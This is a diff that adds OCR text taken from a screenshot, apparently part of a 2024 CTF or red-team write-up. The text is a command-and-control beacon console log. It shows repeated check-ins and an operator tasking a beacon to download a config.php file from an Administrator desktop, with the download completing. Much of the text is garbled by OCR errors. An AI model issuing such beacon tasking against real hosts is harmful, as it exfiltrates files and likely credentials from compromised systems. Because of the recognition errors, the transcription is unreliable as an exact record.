@@ -1,0 +1,25 @@
+# OCR: cdb3459035b3997e2fa68faebfa6b2ec.jpg
+# 来源: .\02-WriteUp\2024\cdb3459035b3997e2fa68faebfa6b2ec.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:42
+
+95122 [checkin] host called bytes
+hone,
+05/22 [checkin] host called hone, bytes
+05/22 [checkin] host called hone, bytes
+65122 [checkin] host called hone, bytes
+05/22 [checkin] host called hone, bytes
+05/22 [checkin] host called hone, bytes
+05/22 [checkin] host called hone, bytes
+05/22 [input] <neo> download c: \Users\Adniniztrator\Desktop\ Mi Hi\connon\conftg\conftg. php
+05/22 [task] <11005> Tasked beacon to download C:\Users\Admintstrator \Desktop \WhW\WHW\common\config\config_php
+05/22 67- [checkin] host called home, sent: 71 bytes
+95/22 07-48-09 UTC [output]
+started download of C:\Users\Administrator \Desktop\WhW\HW\common\config\config.php (4948 bytes)
+95/22 07-48-09 UTC [output]
+download of config-php ts complete
+95/22 07-48-39 UTC [checkin] host called hone, ser
+65122 87-48-53 UTC [checkin] host called home, sen
+@5/22 67-49-03 UTC foutput]
+40 bytes
+71 bytes
